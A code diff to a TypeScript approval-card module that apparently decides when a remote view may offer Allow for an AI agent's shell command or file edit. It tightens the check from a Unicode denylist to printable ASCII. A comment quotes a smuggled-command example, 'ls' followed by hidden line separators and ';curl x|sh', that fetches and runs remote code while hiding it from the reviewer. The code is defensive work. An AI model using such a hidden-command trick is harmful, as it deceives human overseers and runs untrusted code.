@@ -252,14 +252,15 @@ export function cardInput(input: Record<string, unknown>, decisive: readonly str
 // refused (Runner.respondApproval). An edit shows its path, as before.
 export const REMOTE_COMMAND_CHARS = 160;
 // What such a card says there, and what an allow from there is told.
-export const REMOTE_ALLOW_REFUSED = "It's too long to show in full here, so it can only be allowed in the Mac app connected straight to its runner.";
+export const REMOTE_ALLOW_REFUSED = "It can't be shown in full here, so it can only be allowed in the Mac app connected straight to its runner.";
 // `cwd` is the thread's folder: a command that runs anywhere else, or asks
 // for the network, has more to it than its line (Codex review, 7 Nov 2026).
 // An edit of a file that runs as code shows all it writes on the Mac, and
 // only its path here (its title says it is one), so it counts too.
 export function remoteCardShowsAll(name: string, input: Record<string, unknown>, cwd?: string, title = ''): boolean {
   if (name === 'permissions' || title.includes(RUNS_AS_CODE) || title.includes(MAYBE_RUNS_AS_CODE)) return false;
-  const fits = (v: string) => v.trim().length <= REMOTE_COMMAND_CHARS && drawnAsWritten(v);
+  // A command's spaces and line breaks at its ends change nothing it does.
+  const fits = (v: string) => drawnAsWritten(v.replace(/^[ \n]+|[ \n]+$/g, ''));
   // An MCP tool's arguments say what it does (a threadbear tool's own ask,
   // in Ask mode, or any other server's), a `command` among them or not:
   // whole only when its one string that isn't an id is the line shown, and short.
@@ -275,33 +276,38 @@ export function remoteCardShowsAll(name: string, input: Record<string, unknown>,
     if (input.network !== undefined || (typeof input.cwd === 'string' && input.cwd !== cwd)) return false;
     return fits(input.command);
   }
-  // An edit's path, a page's address: the line is all it shows, so it
-  // must draw as it is too.
+  // Codex's patch names its files in `paths` (adapters/codex/approvals.ts):
+  // the line shows the one file (summaryField), so more than one, or a
+  // folder it asks to write anywhere under (grantRoot), is more than the
+  // line (Codex review, 9 Nov 2026: the line showed only its reason).
+  if (input.grantRoot !== undefined) return false;
+  if (input.paths !== undefined && !(Array.isArray(input.paths) && input.paths.length === 1 && typeof input.paths[0] === 'string')) return false;
+  // An edit's path, a page's address: the line is all it shows, so it must
+  // fit and draw as it is too, every character of it (a name's spaces count).
   const line = summaryField(input);
-  return line === undefined || drawnAsWritten(line);
+  return line === undefined || (line === line.trim() && drawnAsWritten(line));
 }
 const ID_KEYS = new Set(['threadId', 'id', 'scheduleId', 'project']);
 
-// Characters that break a line, hide, or reorder text as it's drawn,
-// though a shell (or a file name) takes them as ordinary characters:
-// controls (tab, vertical tab, form feed, NEL U+0085, and the rest of C0
-// and C1), format characters (the bidi embeddings, overrides and isolates
-// U+202A to U+202E and U+2066 to U+2069, the marks U+200E, U+200F and
-// U+061C, the zero-width U+200B to U+200D, U+2060 and U+FEFF, the soft
-// hyphen), and the line and paragraph separators U+2028 and U+2029. A
-// line with one may not show what runs: `ls`, six U+2028 and `;curl x|sh`
-// drew as `ls` and blank lines on the phone, whose card stopped at six
-// lines, while bash read the U+2028s as part of a word and ran the curl
-// (security review, 9 Nov 2026). Such a call can only be allowed on the
-// Mac connected straight to its runner, which shows each one by name
-// (the app's ApprovalText).
-export const HIDES_OR_REORDERS = /[\p{Cc}\p{Cf}\p{Zl}\p{Zp}]/u;
+// What a line the phone, the website or another Mac's view shows may hold
+// for Allow to be offered there: printable ASCII, a space to a tilde, and
+// no more than REMOTE_COMMAND_CHARS of it. Anything else can draw
+// differently from how a shell reads it: U+2028 and U+2029 draw as new
+// lines and bash takes them as part of a word (`ls`, six U+2028 and a
+// second command looked like `ls` alone on the phone), bidi controls and
+// even plain Hebrew or Arabic letters reorder the `;` and `|` around them,
+// a no-break space looks like a space and isn't one to a shell, some
+// letters draw as nothing, marks draw over the character before, and a
+// wide character makes the line longer than its count (the backend cuts
+// the line at 300 bytes). Such a call can only be allowed on the Mac
+// connected straight to its runner, which names each one (the app's
+// ApprovalText.shown). Security review and Codex's review of the fix,
+// 9 Nov 2026.
+export const REMOTE_LINE = /^[\x20-\x7e]*$/;
 
-// Whether `v` draws as it reads: nothing from HIDES_OR_REORDERS in it,
-// apart from plain spaces, tabs and line breaks at its ends, which hide
-// nothing.
+// Whether `v` draws on a remote card exactly as it reads (REMOTE_LINE).
 export function drawnAsWritten(v: string): boolean {
-  return !HIDES_OR_REORDERS.test(v.replace(/^[ \t\r\n]+|[ \t\r\n]+$/g, ''));
+  return v.length <= REMOTE_COMMAND_CHARS && REMOTE_LINE.test(v);
 }
 
 // The string a remote card's one line is made from (sync.ts inputSummary):
@@ -311,6 +317,8 @@ export function summaryField(input: Record<string, unknown>): string | undefined
     const v = input[k];
     if (typeof v === 'string' && v.trim()) return v;
   }
+  // A Codex patch's one file, before its reason.
+  if (Array.isArray(input.paths) && input.paths.length === 1 && typeof input.paths[0] === 'string' && input.paths[0].trim()) return input.paths[0];
   for (const v of Object.values(input)) if (typeof v === 'string' && v.trim()) return v;
   return undefined;
 }
